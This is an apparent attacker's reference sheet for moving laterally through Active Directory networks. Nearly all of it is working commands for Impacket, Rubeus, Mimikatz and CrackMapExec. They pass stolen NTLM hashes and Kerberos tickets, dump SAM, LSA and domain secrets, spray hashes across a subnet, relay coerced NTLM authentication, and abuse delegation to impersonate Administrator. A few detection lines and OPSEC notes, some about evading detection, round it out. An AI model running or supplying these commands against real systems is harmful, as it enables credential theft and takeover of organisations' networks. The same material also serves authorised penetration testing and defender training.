# Active Directory Lateral Movement Reference

## Pass-the-Hash (PtH) — T1550.002

### Overview
Use NTLM hash directly for authentication without knowing the plaintext password.
Works with any tool that supports NTLM authentication.

### Impacket Suite
```
# wmiexec — semi-interactive, no binary upload
impacket-wmiexec -hashes :NTHASH domain/user@<TARGET>

# psexec — SYSTEM shell, creates service
impacket-psexec -hashes :NTHASH domain/user@<TARGET>

# smbexec — no binary upload, service-based
impacket-smbexec -hashes :NTHASH domain/user@<TARGET>

# dcomexec — uses DCOM objects
impacket-dcomexec -hashes :NTHASH domain/user@<TARGET>

# atexec — scheduled task execution
impacket-atexec -hashes :NTHASH domain/user@<TARGET> 'whoami'

# secretsdump — extract more creds from target
impacket-secretsdump -hashes :NTHASH domain/user@<TARGET>
```

### Evil-WinRM
```
evil-winrm -i <TARGET> -u user -H NTHASH
```

### CrackMapExec / NetExec
```
# Execute command
crackmapexec smb <TARGET> -u user -H NTHASH -x 'whoami'
nxc smb <TARGET> -u user -H NTHASH -x 'whoami'

# Spray hash across subnet
crackmapexec smb 192.168.1.0/24 -u user -H NTHASH

# Dump SAM from target
crackmapexec smb <TARGET> -u user -H NTHASH --sam

# Dump LSA secrets
crackmapexec smb <TARGET> -u user -H NTHASH --lsa
```

### RDP Pass-the-Hash (Restricted Admin)
```
# Requires Restricted Admin mode enabled on target
xfreerdp /u:user /pth:NTHASH /v:<TARGET>:3389

# Enable Restricted Admin remotely
crackmapexec smb <TARGET> -u admin -H NTHASH -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

### Detection
- Event 4624 logon type 3 (network) with NTLM authentication
- Event 4625 on failures
- Unusual NTLM traffic from workstations to servers

---

## Pass-the-Ticket (PtT) — T1550.003

### Overview
Use stolen Kerberos tickets (TGT or TGS) to authenticate as another user.
Works when you have a valid ticket but not the hash or password.

### Export Tickets (Windows)
```
# Rubeus — dump all tickets from memory
Rubeus.exe dump /nowrap

# Rubeus — dump specific user's tickets
Rubeus.exe dump /user:admin /nowrap

# Mimikatz
mimikatz # sekurlsa::tickets /export
# Exports .kirbi files to current directory
```

### Export Tickets (Linux)
```
# Tickets stored in ccache files
ls /tmp/krb5cc_*
cp /tmp/krb5cc_<UID> /tmp/stolen_ticket.ccache

# Convert kirbi ↔ ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### Inject and Use Tickets (Windows)
```
# Rubeus — inject into current session
Rubeus.exe ptt /ticket:<base64_ticket>
Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz
mimikatz # kerberos::ptt ticket.kirbi

# Verify injection
klist    # Should show the injected ticket

# Now access target using Kerberos
dir \\<TARGET>\C$
Enter-PSSession -ComputerName <TARGET>
```

### Use Tickets (Linux with Impacket)
```
# Set ticket for use
export KRB5CCNAME=/path/to/ticket.ccache

# Use with any Impacket tool
impacket-psexec -k -no-pass domain/user@<TARGET>
impacket-wmiexec -k -no-pass domain/user@<TARGET>
impacket-smbexec -k -no-pass domain/user@<TARGET>
impacket-secretsdump -k -no-pass domain/user@<TARGET>
```

---

## Overpass-the-Hash (NTLM → Kerberos)

### Overview
Use an NTLM hash to request a Kerberos TGT, then authenticate via Kerberos.
Useful when NTLM auth is blocked but Kerberos is allowed.

### Rubeus (Windows)
```
# Request TGT with NTLM hash and inject into session
Rubeus.exe asktgt /user:user /domain:domain.local /rc4:NTHASH /ptt

# With AES key instead of NTLM
Rubeus.exe asktgt /user:user /domain:domain.local /aes256:<AES_KEY> /ptt

# Request and save to file
Rubeus.exe asktgt /user:user /domain:domain.local /rc4:NTHASH /outfile:tgt.kirbi
```

### Impacket (Linux)
```
# Request TGT
impacket-getTGT -hashes :NTHASH domain.local/user
# Saves: user.ccache

# Use TGT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@<TARGET>
```

### Mimikatz
```
# Overpass-the-Hash — spawns process with Kerberos identity
mimikatz # sekurlsa::pth /user:user /domain:domain.local /ntlm:NTHASH /run:cmd.exe
# New cmd.exe now has TGT for user — access Kerberos-protected resources
```

---

## NTLM Relay — T1557

### Overview
Relay captured NTLM authentication from one host to another.
Requires: SMB signing disabled/not required on target.

### Setup
```
# 1. Disable Responder's SMB and HTTP (we'll relay, not crack)
# Edit /usr/share/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# 2. Start ntlmrelayx targeting specific hosts
impacket-ntlmrelayx -t smb://<TARGET> -smb2support

# With interactive SMB shell
impacket-ntlmrelayx -t smb://<TARGET> -smb2support -i
# Connect: nc 127.0.0.1 11000

# Relay to LDAP (AD privilege escalation)
impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user attacker -smb2support

# Relay to multiple targets
impacket-ntlmrelayx -tf targets.txt -smb2support

# Execute command on relay
impacket-ntlmrelayx -t smb://<TARGET> -smb2support -c 'whoami'
```

### Trigger NTLM Authentication
```
# Responder (LLMNR/NBT-NS poisoning)
responder -I eth0 -wrfv

# PetitPotam (force DC authentication — no creds needed)
python3 PetitPotam.py <LISTENER_IP> <DC_IP>

# PrinterBug / SpoolSample (force machine auth)
python3 printerbug.py domain/user:pass@<DC_IP> <LISTENER_IP>

# Coerce authentication via file share
# Create .url/.scf file on writable share → triggers NTLMv2 to listener
```

### Check SMB Signing
```
# Find targets with SMB signing not required
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

---

## S4U Delegation Abuse

### Constrained Delegation
```
# Find accounts with constrained delegation
impacket-findDelegation domain.local/user:pass -dc-ip <DC_IP>

# S4U2Self + S4U2Proxy to impersonate admin to target SPN
impacket-getST -spn 'cifs/<TARGET>' -impersonate Administrator -hashes :NTHASH domain.local/svc_account -dc-ip <DC_IP>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@<TARGET>
```

### Resource-Based Constrained Delegation (RBCD)
```
# If you can write to msDS-AllowedToActOnBehalfOfOtherIdentity
# 1. Create machine account (if MAQ > 0)
impacket-addcomputer domain.local/user:pass -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip <DC_IP>

# 2. Set RBCD on target
impacket-rbcd domain.local/user:pass -delegate-from 'FAKE$' -delegate-to '<TARGET>$' -action write -dc-ip <DC_IP>

# 3. Get service ticket as admin
impacket-getST -spn 'cifs/<TARGET>' -impersonate Administrator domain.local/'FAKE$':'FakePass123!' -dc-ip <DC_IP>

# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@<TARGET>
```

---

## OPSEC Notes
- Pass-the-Hash generates NTLM event 4624 type 3 — standard network logon
- Pass-the-Ticket uses Kerberos — less NTLM logging, harder to detect
- Overpass-the-Hash blends NTLM and Kerberos — may evade NTLM-only detection
- NTLM relay requires SMB signing disabled — check first with CME
- Delegation abuse generates service ticket requests — event 4769
- PtH to multiple hosts in quick succession is a strong indicator of compromise
